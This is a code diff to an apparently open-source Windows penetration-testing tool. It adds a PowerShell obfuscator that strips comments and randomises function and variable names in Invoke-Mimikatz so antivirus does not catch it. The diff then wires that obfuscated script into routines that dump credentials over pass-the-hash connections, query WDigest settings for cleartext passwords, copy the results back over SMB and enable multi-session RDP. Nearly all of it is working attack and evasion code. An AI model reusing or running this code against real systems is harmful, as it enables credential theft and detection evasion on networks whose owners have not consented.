@@ -9,6 +9,9 @@
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
 import socket, fcntl, struct, time, base64, logging, urllib
 
+import re, random
+import requests, OpenSSL
+
 import time
 import xml.etree.ElementTree as ET
 
@@ -133,6 +136,7 @@ from impacket.dcerpc.v5.rpcrt import DCERPC_v5
 from impacket.dcerpc.v5 import transport, samr
 from impacket import ntlm
 from time import strftime, gmtime
+#from classes.bcolours import *
 
 yesanswers = ["yes", "y", "Y", "Yes", "YES", "pwn", "PWN"]
 noanswers = ["no", "NO", "n", "N"]
@@ -150,6 +154,203 @@ def banner():
 """
 	print colored("\nRichard Davy - Personal Build",'blue')
 	print colored("Qui a nuce nucleum esse vult, frangat nucem\n",'blue')
+
+###############################################
+#Powershell Obfuscation Code Borrowed from    #
+#https://github.com/loneferret/cheapObfuscator#
+###############################################
+
+PSHscript = ''
+
+# List of variable names to ignore in hopes not to break stuff
+IGNORE = ['$true','$false','Main','Invoke','$True','$False','$_','$args','$Bytes', #'Get',
+			'$ExeArgs', '$Win32Constants','Win32Constants','Win32Functions','$Win32Functions',
+			'Get-PEBasicInfo','$PEBytes', '$PEHandle','PEHandle','$PELoadedInfo','ExeArgs',
+			'$Win32Types','Win32Types','PEInfo','$PEInfo','$StartAddress','StartAddress',
+			'Size','$Size','$OriginalImageBase','OriginalImageBase']
+
+def writeNewFile(newContent):
+	# Writes the file Powershell file
+	newPSH = file('./ps_scripts/a', 'w')
+	for i in newContent:
+		newPSH.write(str(i)+"\n")
+
+	return True
+
+def removeEmptyLines(content):
+	# Remove empty lines
+
+	newlines = []
+	for i in content:
+		if(i.strip()):
+			newlines.append(i)
+		else:
+			continue
+
+	return newlines
+
+def makeRandom(size=8, chars=string.ascii_uppercase + string.ascii_lowercase):
+	# http://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits-in-python
+	return ''.join(random.choice(chars) for _ in range(size))
+
+def replaceFunctionCalls(content, oldName, newName):
+	# Searches the file to replace original function names with new name
+	newlines = []
+	for line in content:
+		if(oldName.endswith(')')):
+			newlines.append(line.replace(oldName, newName+'()'))
+		else:
+			newlines.append(line.replace(oldName, newName))
+
+	return newlines
+
+def checkIgnoreWords(wordcheck):
+	# lazy ass way 
+	result = True
+	for word in IGNORE:
+		if word in wordcheck:
+			result = False
+			break
+	return result
+
+def getFunctionNames(content):
+	# Searches for Function names then finds & replaces with random string
+	replaceList = {}
+	newlines = []
+	for i in content:
+		pattern = re.search('^\s*[f|F]unction\s(.*\w$)', i)
+		if (pattern):
+			if (checkIgnoreWords(pattern.group(1))):
+				functionName = pattern.group(1)
+				newName = makeRandom()
+				replaceList[functionName] = newName
+				if(functionName.endswith(')')): 
+					parenValues = re.search('\((.+)\)', functionName) # \((.+)\) <-- regex to find (...)
+					if(parenValues not in IGNORE):
+						newlines.append(i.replace(functionName,newName+'('+parenValues.group(1)+')'))
+					else:
+						newlines.append(i.replace(functionName,newName+'()'))
+				else:
+					newlines.append(i.replace(functionName,newName))
+
+			else:
+				newlines.append(i)
+		else:
+			newlines.append(i)
+	return newlines, replaceList
+
+def deleteLines(start, end, content):
+	# Delete lines between start & end inclusively
+	newLines = []	# just easier using a list for the moment
+	for i, line in enumerate(content):
+		if (i < (start - 1)):
+			newLines.append(line)
+			#print line
+			continue
+		elif (i >= end):
+			newLines.append(line)
+			#print line
+			continue
+		else:
+			continue
+
+	return newLines
+
+def removeComments(content):
+	# Needs a better regex
+	newlines = []
+	for i in content:
+		if (re.search('^(\s*)#', i.rstrip())):
+			continue
+		else:
+			newlines.append(i)
+
+	return newlines	
+
+def removeBlockComments(mimi):
+	# Removes commented lines from Invoke-Mimikatz.ps1
+	mimiLines = mimi.splitlines()
+	commentsRemoved = ''
+	first = 0
+	second = 0
+	for num, line in enumerate(mimiLines, 1):
+		if (line.startswith('<#')):
+			first = num
+		if (line.startswith('#>')):
+			second = num
+
+	commentsRemoved = deleteLines(first, second, mimiLines)
+	return commentsRemoved
+
+def replaceVariableNames(content, oldName, newName):
+	# Replaces variable names with new ones
+	newlines = []
+	for line in content:
+			newlines.append(line.replace(oldName, "$"+newName))
+
+	return newlines
+
+def getVariablesNames(content):
+	# Change variable names
+	replaceList = {}
+	temp = []
+	newlines = []
+	for i in content:
+		pattern = re.search('(\$\w+)[-\s=|\s=]', i)
+		if((pattern) and pattern.group(1) not in IGNORE):
+			#print pattern.group(1)
+			temp.append(pattern.group(1))
+
+	for i in set(temp):
+		replaceList[i] = makeRandom()
+		#print "$"+i + " $" + replaceList[i]
+
+	return replaceList
+
+def getTargetPSH(url):
+
+	invoke = False
+	
+	orgPSH = open('./ps_scripts/Invoke-Mimikatz.ps1').read()
+	orgPSH.splitlines()
+	
+	if("Invoke-" in orgPSH):
+		invoke = True
+	return orgPSH,invoke
+
+def obfuscate_mimikatz():
+	global NUMFUNCTIONNAMES, NUMVARIABLES
+
+	url=""		
+	PSHscript, invoke = getTargetPSH(url)
+	PSHscript = removeBlockComments(PSHscript)
+	PSHscript = removeEmptyLines(PSHscript)
+	PSHscript = removeComments(PSHscript)
+	
+	PSHscript, dictListFunctions = getFunctionNames(PSHscript)
+	for key in dictListFunctions:
+		PSHscript = replaceFunctionCalls(PSHscript, key, dictListFunctions[key])
+	
+	dictListVars = getVariablesNames(PSHscript)
+	for key in dictListVars:
+		PSHscript = replaceVariableNames(PSHscript, key, dictListVars[key])
+
+	if(invoke):
+		# Cheap way to find if Invoke- is in the file
+		newFunctionName = makeRandom()
+		PSHscript = replaceFunctionCalls(PSHscript, 'Invoke-Mimikatz', 'Invoke-' + newFunctionName)
+		print("[-] New function name: " + "Invoke-"+newFunctionName)
+
+	print("[-] Number of functions renamed: " + (str(len(dictListFunctions))))
+	print("[-] Number of variables renamed: " + (str(len(dictListVars))))
+
+	writeNewFile(PSHscript)
+
+	return "Invoke-"+newFunctionName
+
+#End of PowerShell Obfuscation Code
+##############################################################################################################
+
 
 class AbortMouse(PyMouseEvent):
 	def click(self, x, y, button, press):
@@ -1321,7 +1522,10 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Attempting to Run Mimikatz",'green')
 					fout=open('/tmp/mimi.ps1','w')
 					fout.write('Import-Module c:\\a.ps1\n')
-					fout.write('castell -Dwmp > c:\\mimi_creddump.txt\n')
+					
+					InvokeFunction=obfuscate_mimikatz()
+					
+					fout.write(InvokeFunction+' -DumpCreds > c:\\mimi_creddump.txt\n')
 					fout.write('exit\n')
 					fout.close() 
 					
@@ -1528,8 +1732,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("\n[+]Running Stealth Mimikatz",'blue')
 	
 					shellscript = "./ps_scripts/a"
-					InvokeFunction = "castell"
-					FunctionCommand = "-Dwmp > c:\\creds.txt"
+					FunctionCommand = "-DumpCreds > c:\\creds.txt"
 
 					#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
 					proc = subprocess.Popen("/usr/bin/pth-winexe -U \'"+domain_name+"\\"+user+"%"+passw+"\' --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
@@ -1539,6 +1742,11 @@ def datadump(user, passw, host, path, os_version):
 					else:
 						print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
 					
+					#######################################################
+					#THIS BIT HERE CALLS FOR THE POWERSHELL TO BE EXECUTED#
+					#######################################################
+
+					InvokeFunction=obfuscate_mimikatz()
 					cps(shellscript,stealth_mimi,InvokeFunction,FunctionCommand,host,"system")
 						
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U \'"+user+"%"+passw+"\' -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
@@ -1603,9 +1811,9 @@ def datadump(user, passw, host, path, os_version):
 					print colored("\n[+]Running Mimikatz MultiRDP",'blue')
 	
 					shellscript = "./ps_scripts/a"
-					InvokeFunction = "castell"
 					FunctionCommand = "-Command \"ts::multirdp\""
 
+					InvokeFunction=obfuscate_mimikatz()
 					cps(shellscript,multi_rdp,InvokeFunction,FunctionCommand,host,"system")
 
 					sys.exit()
@@ -2275,6 +2483,7 @@ def hashparse(hashfolder,hashfile):
 								if hash_list[y].split(":")[0]!=hash_list[z].split(":")[0]:
 									#Build hash match string
 									ntduplicates.append("Hash Match:"+hash_list[y].split(":")[0]+":" +hash_list[z].split(":")[0])
+									
 									#Add previous found hash to dirty list
 									usedhash.append(hash_list[y].split(":")[3])
 						set(usedhash)
